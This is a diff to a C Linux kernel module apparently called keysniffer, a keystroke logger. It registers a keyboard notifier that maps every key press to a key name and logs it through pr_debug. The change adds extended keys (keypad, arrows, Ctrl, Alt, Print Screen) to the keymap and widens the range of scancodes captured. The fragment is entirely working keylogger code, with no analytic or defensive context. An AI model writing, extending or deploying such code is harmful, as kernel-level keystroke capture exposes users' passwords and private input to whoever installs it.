@@ -38,7 +38,14 @@ static const char* us_keymap[][2] = {
 	{"_KPD5_", "_KPD5_"}, {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},
 	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, {"_KPD._", "_DEL_"},
 	{"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, {"\0", "\0"}, {"F11", "F11"},
-	{"F12", "F12"},
+	{"F12", "F12"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
+	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
+	{"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"/", "/"}, {"_PRTSCR_", "_PRTSCR_"},
+	{"_ALT_", "_ALT_"}, {"\0", "\0"}, {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"},
+	{"_PGUP_", "_PGUP_"}, {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
+	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"}, {"_DEL_", "_DEL_"},
+	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
+	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"_PAUSE_", "_PAUSE_"},
 };
 
 static struct notifier_block keysniffer_blk = {
@@ -48,15 +55,16 @@ static struct notifier_block keysniffer_blk = {
 int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param)
 {
 	struct keyboard_notifier_param *param = _param;
-	pr_debug("keysniffer_cb called.\n");
-	pr_debug("down: 0x%x, shift: 0x%d, value: 0x%x, key: ",
-		param->down, param->shift, param->value);
+	/* pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%d, value: 0x%x\n",
+		code, param->down, param->shift, param->value); */
 
-	if (param->down && param->value >= 0x1 && param->value <= 0x58) {
-		if (param->shift)
-			pr_debug("%s\n", us_keymap[param->value][1]);
-		else
-			pr_debug("%s\n", us_keymap[param->value][0]);
+	if (param->down) {
+		if (param->value >= 0x1 && param->value <= 0x77) {
+			if (param->shift)
+				pr_debug("%s\n", us_keymap[param->value][1]);
+			else
+				pr_debug("%s\n", us_keymap[param->value][0]);
+		}
 	}
 
 	return NOTIFY_OK;
